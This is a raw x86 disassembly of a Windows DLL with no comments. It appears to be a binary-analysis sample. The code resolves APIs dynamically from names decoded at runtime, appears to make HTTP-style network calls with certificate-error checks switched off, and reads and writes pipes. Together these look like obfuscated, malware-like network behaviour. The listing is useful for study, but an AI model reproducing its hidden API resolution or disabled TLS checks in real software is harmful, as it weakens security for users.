call sub_100311f0
mov eax [ ebp - 0x11e8 ]
test eax eax
je r-xdata
push esi
mov esi [ ebp - 0x11ec ]
push esi
call sub_100311f0
mov [ ebp - 0x11dc ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1158 ]
call sub_100036b0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0xc ]
call sub_10001880
mov eax [ edi + 0x48 ]
push esi
call eax
push [ ebp - 0x11e4 ]
mov eax [ edi + 0x48 ]
call eax
mov esi [ ebp - 0x11ec ]
lea eax [ ebp - 0x11b8 ]
push eax
push esi
call sub_10031f80
jmp r-xdata
push eax
lea eax [ ebp - 0x1140 ]
mov [ ebp - 0x1190 ] 0x0
mov [ ebp - 0x118c ] 0x0
lea ecx [ ebp - 0x11a0 ]
push eax
mov [ ebp - 0x118c ] 0xf
mov [ ebp - 0x1190 ] 0x0
mov [ ebp - 0x11a0 ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x9
lea eax [ ebp - 0x11a0 ]
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x11b8 ]
call sub_100050b0
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x118c ] 0x10
jb r-xdata
mov [ ebp - 0x11dc ] 0x1
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp - 0x11b8 ]
call sub_10001880
cmp [ ebp - 0x11a8 ] 0xec77be
mov [ ebp - 0x118c ] 0xf
mov [ ebp - 0x1190 ] 0x0
mov [ ebp - 0x11a0 ] 0x0
ja r-xdata
push [ ebp - 0x11a0 ]
call j_sub_1003f3e3#2
add esp 0x4
lea eax [ ebp - 0x11e8 ]
mov [ ebp - 0x11e8 ] 0x0
push eax
push 0x1130
lea eax [ ebp - 0x1140 ]
push eax
mov eax [ edi + 0x68 ]
push esi
call eax
test eax eax
jne r-xdata
sub_10026180
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10026300
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100261b0
push ebp
mov ebp esp
push 0xffffffff
push sub_100504dc
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
sub esp 0x3c
mov esi esp
mov [ ebp - 0x10 ] esp
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] esi
mov ecx esi
push 0xffffffff
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov [ esi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp + 0x20 ]
push eax
lea ecx [ esi + 0x18 ]
call sub_100048b0
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x2c ]
push eax
lea ecx [ esi + 0x24 ]
call sub_100048b0
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp + 0x38 ]
push eax
lea ecx [ esi + 0x30 ]
call sub_100048b0
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_10030eb0
mov [ ebp - 0x4 ] 0x6
mov [ edi ] r--data
mov [ edi + 0x88 ] 0xf
mov [ edi + 0x84 ] 0x0
mov [ edi + 0x74 ] 0x0
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp + 0x44 ]
mov [ edi + 0x44 ] eax
mov [ edi + 0x40 ] 0x0
mov [ edi + 0x3c ] 0x0
mov [ edi + 0x70 ] 0x0
mov [ edi + 0x48 ] 0x0
mov [ edi + 0x4c ] 0x0
mov [ edi + 0x50 ] 0x0
mov [ edi + 0x54 ] 0x0
mov [ edi + 0x58 ] 0x0
mov [ edi + 0x60 ] 0x0
mov [ edi + 0x64 ] 0x0
mov [ edi + 0x68 ] 0x0
mov [ edi + 0x6c ] 0x0
mov [ edi + 0x8c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_100047b0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x40
sub_10026300
push ebp
mov ebp esp
push 0xffffffff
push sub_10050513
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x70 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call [ FreeLibrary@IAT ]
push ecx
call eax
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x88 ] 0x10
jb r-xdata
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x88 ] 0xf
mov [ esi + 0x84 ] 0x0
mov [ esi + 0x74 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_100310d0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x74 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100263c0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1005053b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x103c
call sub_10048ab0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1038 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1050 ]
mov [ fs : 0x0 ] eax
mov edi ecx
cmp [ rw-data ] 0x0
mov esi [ InterlockedExchange@IAT ]
jne r-xdata
mov ebx [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x11
call sub_100383b0
push eax
push rw-data
call esi
mov eax [ rw-data ]
push ebx
mov ebx [ LoadLibraryW@IAT ]
mov [ esp + 0x18 ] eax
call ebx
mov [ edi + 0x3c ] eax
test eax eax
je r-xdata
mov ecx 0x18
call sub_100383b0
push eax
push rw-data
call esi
push [ esp + 0x14 ]
call ebx
mov [ edi + 0x40 ] eax
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
push eax
push [ edi + 0x3c ]
call [ GetProcAddress@IAT ]
mov [ edi + 0x48 ] eax
mov ecx 0x5f
call sub_100382c0
push eax
push rw-data
call esi
mov ebx [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x6c
call sub_100382c0
push eax
push rw-data
call esi
mov ecx [ esp + 0x1050 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x1038 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x14 ] eax
jne r-xdata
mov ecx 0x6d
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x30 ] eax
jne r-xdata
mov ecx 0x6e
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x2c ] eax
jne r-xdata
mov ecx 0x6f
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x24 ] eax
jne r-xdata
mov ecx 0x70
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x18 ] eax
jne r-xdata
mov ecx 0x71
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x1c ] eax
jne r-xdata
mov ecx 0x72
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x20 ] eax
jne r-xdata
mov ecx 0x73
call sub_100382c0
push eax
push rw-data
call esi
mov esi [ rw-data ]
push ebx
push [ edi + 0x40 ]
mov ebx [ GetProcAddress@IAT ]
call ebx
push [ esp + 0x14 ]
mov [ edi + 0x4c ] eax
push [ edi + 0x40 ]
call ebx
push [ esp + 0x30 ]
mov [ edi + 0x50 ] eax
push [ edi + 0x40 ]
call ebx
push [ esp + 0x2c ]
mov [ edi + 0x54 ] eax
push [ edi + 0x40 ]
call ebx
push [ esp + 0x24 ]
mov [ edi + 0x58 ] eax
push [ edi + 0x40 ]
call ebx
push [ esp + 0x18 ]
mov [ edi + 0x5c ] eax
push [ edi + 0x40 ]
call ebx
push [ esp + 0x1c ]
mov [ edi + 0x60 ] eax
push [ edi + 0x40 ]
call ebx
push [ esp + 0x20 ]
mov [ edi + 0x64 ] eax
push [ edi + 0x40 ]
call ebx
push esi
push [ edi + 0x40 ]
mov [ edi + 0x68 ] eax
call ebx
cmp [ edi + 0x4c ] 0x0
mov [ edi + 0x6c ] eax
je r-xdata
mov ecx 0x74
call sub_100382c0
push eax
push rw-data
call esi
cmp [ edi + 0x50 ] 0x0
je r-xdata
cmp [ edi + 0x54 ] 0x0
je r-xdata
cmp [ edi + 0x58 ] 0x0
je r-xdata
cmp [ edi + 0x5c ] 0x0
je r-xdata
cmp [ edi + 0x60 ] 0x0
je r-xdata
cmp [ edi + 0x64 ] 0x0
je r-xdata
cmp [ edi + 0x68 ] 0x0
je r-xdata
test eax eax
je r-xdata
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x1058 ] 0x0
mov eax [ edi + 0x48 ]
test eax eax
je r-xdata
cmp [ edi + 0x84 ] 0x0
jne r-xdata
lea ecx [ esp + 0x28 ]
mov [ esp + 0x28 ] 0xff5
push ecx
lea ecx [ esp + 0x50 ]
push ecx
push 0x0
call eax
test eax eax
jne r-xdata
cmp [ edi + 0x88 ] 0x10
lea ecx [ edi + 0x74 ]
jb r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
jmp r-xdata
lea eax [ esp + 0x4c ]
push eax
lea ecx [ esp + 0x38 ]
call sub_10026e20
push 0x0
push 0x0
push ecx
push 0x3
mov ecx [ ecx ]
cmp [ esp + 0x58 ] 0x10
lea eax [ esp + 0x44 ]
cmovae eax [ esp + 0x44 ]
push eax
mov eax [ edi + 0x68 ]
call eax
mov ecx eax
mov [ edi + 0x70 ] eax
test ecx ecx
jne r-xdata
mov eax [ edi + 0x8c ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor esi esi
jmp r-xdata
mov esi 0x1
imul eax eax 0x3e8
push 0x4
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
mov eax [ edi + 0x6c ]
push 0x2
push ecx
call eax
push 0x4
lea eax [ esp + 0x14 ]
push eax
mov eax [ edi + 0x6c ]
push 0x7
push [ edi + 0x70 ]
call eax
push 0x4
lea eax [ esp + 0x14 ]
push eax
mov eax [ edi + 0x6c ]
push 0x6
push [ edi + 0x70 ]
call eax
mov [ esp + 0x1058 ] 0xffffffff
lea ecx [ esp + 0x34 ]
call sub_10001880
mov eax esi
sub_100267e0
push ebp
mov ebp esp
push 0xffffffff
push sub_100505bb
mov eax [ fs : 0x0 ]
push eax
mov eax 0x14d4
call sub_10048ab0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x14e0 ] ebx
mov [ ebp - 0x149c ] eax
mov [ ebp - 0x1490 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ edi + 0x44 ] 0x0
mov esi [ InterlockedExchange@IAT ]
jne r-xdata
push 0x3c
lea eax [ ebp - 0x14dc ]
push 0x0
push eax
call sub_10045ec0
push 0xea3
mov [ ebp - 0x14dc ] 0x3c
mov [ ebp - 0x14c8 ] 0xea3
call sub_1003c61a
push [ ebp - 0x14c8 ]
mov [ ebp - 0x14cc ] eax
push 0x0
push eax
call sub_10045ec0
push 0x10d9
mov [ ebp - 0x14ac ] 0x10d9
call sub_1003c61a
push [ ebp - 0x14ac ]
mov [ ebp - 0x14b0 ] eax
push 0x0
push eax
call sub_10045ec0
add esp 0x2c
lea ecx [ ebp - 0x14dc ]
cmp [ ebp + 0x20 ] 0x10
lea eax [ ebp + 0xc ]
cmovae eax [ ebp + 0xc ]
push ecx
push __dos_header
push [ ebp + 0x1c ]
push eax
mov eax [ edi + 0x64 ]
call eax
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ edi + 0x60 ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push [ ebp - 0x14c4 ]
push [ ebp - 0x14cc ]
push [ edi + 0x70 ]
call eax
mov [ ebp - 0x1488 ] eax
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push [ ebp - 0x14cc ]
mov esi eax
call j_sub_1003f3e3
push [ ebp - 0x14b0 ]
call j_sub_1003f3e3
add esp 0x8
push esi
push ebx
call sub_100311f0
mov [ ebp - 0x1490 ] 0x1
jmp r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx 0x5e
call sub_100382c0
push eax
push rw-data
call esi
cmp [ rw-data ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
push [ ebp - 0x14cc ]
mov esi eax
call j_sub_1003f3e3
push [ ebp - 0x14b0 ]
call j_sub_1003f3e3
add esp 0x8
push esi
push ebx
call sub_100311f0
mov [ ebp - 0x1490 ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x20 ] 0x10
jb r-xdata
mov ecx edx
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x1488 ] eax
xor ecx ecx
jmp r-xdata
mov edx [ rw-data ]
mov ecx edx
mov [ ebp - 0x148c ] edx
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x1484 ] eax
lea esp [ esp ]
mov ecx 0x75
call sub_100382c0
push eax
push rw-data
call esi
mov [ ebp + 0x20 ] 0xf
mov [ ebp + 0x1c ] 0x0
mov [ ebp + 0xc ] 0x0
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x20
push [ ebp + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx [ ebp - 0x1488 ]
push ecx
push edx
lea ecx [ ebp + 0xc ]
call sub_10005470
lea eax [ ebp + 0xc ]
mov ecx edi
push eax
push [ ebp - 0x149c ]
call sub_100318a0
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx [ ebp - 0x1484 ]
lea eax [ ebp + 0xc ]
cmp [ ebp + 0x20 ] 0x10
push ecx
cmovae eax [ ebp + 0xc ]
push eax
push edx
call sub_1003d6e7
add esp 0xc
mov ecx 0x800000
test eax eax
mov eax 0x0
cmove eax ecx
cmp [ rw-data ] 0x0
mov [ ebp - 0x1498 ] eax
jne r-xdata
mov ecx [ rw-data ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x14a0 ] ecx
jne r-xdata
mov ecx 0x76
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ edi + 0x44 ] 0x0
push 0x0
cmovne ecx eax
mov eax [ ebp - 0x1498 ]
or eax 0x4040300
push eax
mov eax [ edi + 0x58 ]
push 0x0
push 0x0
push 0x0
push [ ebp - 0x14b0 ]
push ecx
push [ ebp - 0x1488 ]
call eax
push [ ebp - 0x14cc ]
mov esi eax
mov [ ebp - 0x1498 ] esi
call j_sub_1003f3e3
push [ ebp - 0x14b0 ]
call j_sub_1003f3e3
mov edx [ ebp - 0x148c ]
add esp 0x8
mov ecx edx
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x148c ] eax
mov ecx 0x77
call sub_100382c0
push eax
push rw-data
call esi
mov ecx [ ebp - 0x14a0 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx [ ebp - 0x148c ]
lea eax [ ebp + 0xc ]
cmp [ ebp + 0x20 ] 0x10
push ecx
cmovae eax [ ebp + 0xc ]
push eax
push edx
call sub_1003d6e7
add esp 0xc
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x4
lea eax [ ebp - 0x1494 ]
mov [ ebp - 0x1494 ] 0xf380
push eax
mov eax [ edi + 0x6c ]
push 0x1f
push esi
call eax
test eax eax
jne r-xdata
mov eax [ rw-data ]
xor ecx ecx
mov [ ebp - 0x1440 ] ecx
xor esi esi
mov [ ebp - 0x143c ] ecx
mov [ ebp - 0x143c ] 0xf
mov [ ebp - 0x1440 ] ecx
mov [ ebp - 0x1450 ] cl
mov [ ebp - 0x4 ] 0x2
cmp [ edi + 0x44 ] esi
je r-xdata
mov ecx 0x78
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
call [ GetLastError@IAT ]
push [ ebp - 0x1440 ]
cmp [ ebp - 0x143c ] 0x10
lea eax [ ebp - 0x1450 ]
cmovae eax [ ebp - 0x1450 ]
push eax
mov eax [ edi + 0x54 ]
push esi
mov esi [ ebp - 0x1498 ]
push ecx
push esi
call eax
test eax eax
jne r-xdata
mov esi eax
mov [ ebp - 0x1494 ] eax
lea ecx [ esi + 0x1 ]
mov edi edi
mov eax 0x1
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
test al al
jne r-xdata
lea eax [ ebp - 0x1450 ]
sub esi ecx
push eax
push [ ebp - 0x149c ]
mov ecx edi
call sub_100318a0
mov ecx [ ebp - 0x1494 ]
mov eax [ edi + 0x4c ]
push esi
call eax
push [ ebp - 0x1488 ]
mov eax [ edi + 0x4c ]
call eax
lea eax [ ebp - 0x1468 ]
push eax
push ebx
call sub_10031f80
mov [ ebp - 0x1490 ] 0x1
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x1454 ] 0x10
jb r-xdata
mov [ ebp - 0x1484 ] 0x0
mov [ ebp - 0x1458 ] 0x0
mov [ ebp - 0x1454 ] 0x0
mov [ ebp - 0x1454 ] 0xf
mov [ ebp - 0x1458 ] 0x0
mov [ ebp - 0x1468 ] 0x0
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
mov [ ebp - 0x1454 ] 0xf
mov [ ebp - 0x1458 ] 0x0
mov [ ebp - 0x1468 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x143c ] 0x10
jb r-xdata
push [ ebp - 0x1468 ]
call j_sub_1003f3e3#2
add esp 0x4
call [ GetLastError@IAT ]
mov eax [ ebp - 0x1484 ]
test eax eax
je r-xdata
mov [ ebp - 0x143c ] 0xf
mov [ ebp - 0x1440 ] 0x0
mov [ ebp - 0x1450 ] 0x0
push [ ebp - 0x1450 ]
call j_sub_1003f3e3#2
add esp 0x4
push eax
lea eax [ ebp - 0x1438 ]
mov [ ebp - 0x1470 ] 0x0
mov [ ebp - 0x146c ] 0x0
lea ecx [ ebp - 0x1480 ]
push eax
mov [ ebp - 0x146c ] 0xf
mov [ ebp - 0x1470 ] 0x0
mov [ ebp - 0x1480 ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x1480 ]
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x1468 ]
call sub_100050b0
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x146c ] 0x10
jb r-xdata
cmp [ ebp - 0x1458 ] 0x118d1c0
mov [ ebp - 0x146c ] 0xf
mov [ ebp - 0x1470 ] 0x0
mov [ ebp - 0x1480 ] 0x0
ja r-xdata
push [ ebp - 0x1480 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ ebp - 0x1484 ] 0x0
ja r-xdata
lea eax [ ebp - 0x1484 ]
push eax
push 0x1428
lea eax [ ebp - 0x1438 ]
push eax
mov eax [ edi + 0x50 ]
push esi
call eax
test eax eax
je r-xdata
jmp r-xdata
sub_10026e20
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
mov edx esi
push edi
lea edi [ edx + 0x1 ]
xor edx edx
push edx
push esi
call sub_100019e0
pop esi
pop ebp
retn 0x4
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx edi
pop edi
push edx
push esi
call sub_100019e0
pop esi
pop ebp
retn 0x4
sub_10026e60
push ebp
mov ebp esp
push 0xffffffff
push sub_1005060b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x20 ] 0x80
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x8 ] ax
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10026f20
push ebp
mov ebp esp
push 0xffffffff
push sub_10050643
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x1c ]
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x18 ] 0x7
xor eax eax
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] ax
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push [ esi + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10026fe0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050670
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] edx
mov edi ecx
lea ecx [ ebp - 0x2c ]
call sub_1003ba00
mov [ ebp - 0x4 ] 0x0
mov ebx [ Sleep@IAT ]
xor al al
jl r-xdata
push 0x102
call [ SetLastError@IAT ]
xor eax eax
push 0x0
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] 0x0
push eax
push 0x0
push 0x0
push 0x0
push edi
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp ecx 0x2a53
jae r-xdata
push 0x1
call ebx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
ja r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x3c ] r--data
test al al
je r-xdata
lea ecx [ ebp - 0x3c ]
call sub_1003ba00
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov esi [ ebp - 0x20 ]
cmp eax esi
mov edx [ ebp - 0x24 ]
sub ecx edx
sbb eax esi
test eax eax
jg r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x18 ]
push edi
call [ ReadFile@IAT ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x2c ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_100270d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100506c1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x68 ] esi
push [ ebx + 0x10 ]
call [ htonl@IAT ]
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov edx 0xf
mov [ ebp - 0x44 ] 0x0
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x44 ] edx
cmp edx 0x10
mov ecx [ ebp - 0x60 ]
cmovae eax ecx
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x48 ] 0x4
mov [ eax + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x58 ]
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x28 ]
call sub_100050b0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push ebx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] 0x0
call sub_100050b0
push 0x1
lea eax [ ebp - 0x28 ]
mov ecx edi
push eax
call sub_100272b0
test eax eax
jne r-xdata
push [ ebp - 0x58 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x40 ]
mov ecx edi
push eax
call sub_100273a0
test eax eax
jne r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
mov [ ebp - 0x5c ] 0x1
jmp r-xdata
lea eax [ ebp - 0x40 ]
mov ecx esi
push eax
call sub_10004f60
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0xf
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x5c ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x2c ] 0x10
jb r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100272b0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
mov esi ecx
xor ebx ebx
mov ecx [ ebp + 0x8 ]
push edi
cmp [ ecx + 0x10 ] ebx
jbe r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ esp + 0x10 ] 0x1
mov eax [ ecx + 0x10 ]
lea edx [ esp + 0x14 ]
push 0x0
push edx
sub eax ebx
mov [ esp + 0x1c ] 0x0
push eax
call sub_10003630
add eax ebx
push eax
push edi
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
add ebx [ esp + 0x14 ]
call [ GetLastError@IAT ]
mov eax [ esp + 0x10 ]
inc eax
mov [ esp + 0x10 ] eax
cmp eax 0x3
jae r-xdata
mov edi [ esi + 0x1c ]
